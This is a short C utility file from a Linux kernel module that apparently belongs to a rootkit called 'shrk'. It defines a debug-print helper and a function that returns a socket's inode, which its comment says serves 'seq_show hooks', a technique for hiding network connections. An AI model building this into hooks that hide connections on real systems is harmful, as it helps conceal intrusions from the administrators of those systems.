#include "inc/util.h"

#include <linux/module.h>
#include <linux/slab.h>
#include <net/sock.h>

void print_debug(const char *caller, char *msg, ...) {
  char   *fmt = NULL;
  va_list args;

  if (!SHRK_DEBUG)
    return;

  fmt = kmalloc(strlen(msg) + strlen(caller) + 12, GFP_KERNEL);
  sprintf(fmt, "[shrk] %s: %s\n", caller, msg);

  va_start(args, msg);

  vprintk(fmt, args);

  va_end(args);
  kfree(fmt);
}

/*

 * obtains inode from the socket, used by seq_show hooks
 * see the following functions for reference:
 * net/ipv4/tcp_ipv4.c, tcp4_seq_show()
 * core/sock.c, sock_i_ino()

*/
uint64_t inode_from_sock(struct sock *sk) {
  if (NULL == sk || SEQ_START_TOKEN == sk)
    return 0;

  switch (sk->sk_state) {
  case TCP_TIME_WAIT:
    return 0;

  case TCP_NEW_SYN_RECV:
    return 0;
  }

  return sock_i_ino(sk);
}
